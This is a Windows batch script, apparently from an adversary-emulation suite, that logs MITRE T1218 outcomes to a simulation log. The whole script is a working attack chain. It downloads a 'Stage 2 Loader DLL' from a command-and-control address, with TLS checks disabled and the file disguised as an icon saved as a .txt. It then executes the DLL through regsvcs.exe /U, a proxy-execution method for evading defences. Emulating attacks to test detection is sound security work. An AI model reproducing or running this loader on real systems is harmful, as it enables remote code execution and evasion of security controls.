@echo off
setlocal enabledelayedexpansion

REM Placeholder constant declarations (random-named SET vars, one per PHR_*)
SET aB3xY7=%APPDATA%\11606\dd4c05c7
SET kLmN9p=296c4221.txt
SET qWeRtY=https://10.0.0.49/stage/2/icon.png?11606-7
SET zXcVbN=ITZEL-S2B
SET rT5yHj=11606
SET uIoP8l=7
SET mN1bVc=%PUBLIC%\\macula-simulations.log
SET fGhJk0=https://10.0.0.49

REM Capture initial timestamp for debug logging
SET tsvar=!DATE!/!TIME!

REM ========== DEBUG: heartbeat_start ==========
echo [!tsvar!][DEBUG][!zXcVbN!][!rT5yHj!]: heartbeat_start>> "!mN1bVc!" 2>nul

REM Step 1: Heartbeat fetch – download Stage 2 Loader DLL from C2
curl -k -s -o "!aB3xY7!\!kLmN9p!" "!qWeRtY!" >nul 2>&1
SET curl_exit=%ERRORLEVEL%

REM ========== DEBUG: heartbeat_complete ==========
echo [!tsvar!][DEBUG][!zXcVbN!][!rT5yHj!]: heartbeat_complete>> "!mN1bVc!" 2>nul

REM Check if file was downloaded
if not exist "!aB3xY7!\!kLmN9p!" (
    REM File missing – log failure and exit
    for /f "delims=" %%t in ('powershell -nop -c "Get-Date -Format 'yyyy-MM-dd HH:mm:ss.fff'"') do set ftimestamp=%%t
    echo [!ftimestamp!][TTP][!zXcVbN!][!rT5yHj!]: T1218^|System Binary Proxy Execution=[FAIL]:[file_not_downloaded]>> "!mN1bVc!" 2>&1
    exit /b 1
)

REM ========== DEBUG: chdir_start ==========
echo [!tsvar!][DEBUG][!zXcVbN!][!rT5yHj!]: chdir_start>> "!mN1bVc!" 2>nul

REM Step 2: Position working directory
cd /d "!aB3xY7!" >nul 2>&1
if %ERRORLEVEL% neq 0 (
    set chdir_result=1
) else (
    set chdir_result=0
)

REM ========== DEBUG: chdir_result ==========
echo [!tsvar!][DEBUG][!zXcVbN!][!rT5yHj!]: chdir_result=!chdir_result!>> "!mN1bVc!" 2>nul

REM ========== DEBUG: regsvcs_start ==========
echo [!tsvar!][DEBUG][!zXcVbN!][!rT5yHj!]: regsvcs_start>> "!mN1bVc!" 2>nul

REM Step 3: Invoke Stage 2 DLL via regsvcs.exe /U (ComUnregisterFunction)
%SystemRoot%\Microsoft.NET\Framework64\v4.0.30319\regsvcs.exe /U "!kLmN9p!" >NUL 2>&1
SET regsvcs_exit=%ERRORLEVEL%

REM ========== DEBUG: regsvcs_result ==========
echo [!tsvar!][DEBUG][!zXcVbN!][!rT5yHj!]: regsvcs_result=!regsvcs_exit!>> "!mN1bVc!" 2>nul

REM Step 4: Generate TTP log line (timestamp with ms precision)
for /f "delims=" %%t in ('powershell -nop -c "Get-Date -Format 'yyyy-MM-dd HH:mm:ss.fff'"') do set ftimestamp=%%t

if !regsvcs_exit! equ 0 (
    echo [!ftimestamp!][TTP][!zXcVbN!][!rT5yHj!]: T1218^|System Binary Proxy Execution=[OK]:[]>> "!mN1bVc!" 2>&1
) else (
    echo [!ftimestamp!][TTP][!zXcVbN!][!rT5yHj!]: T1218^|System Binary Proxy Execution=[FAIL]:[regsvcs_exit_!regsvcs_exit!]>> "!mN1bVc!" 2>&1
)

REM Exit with regsvcs exit code (0 success, non-zero failure)
exit /b !regsvcs_exit!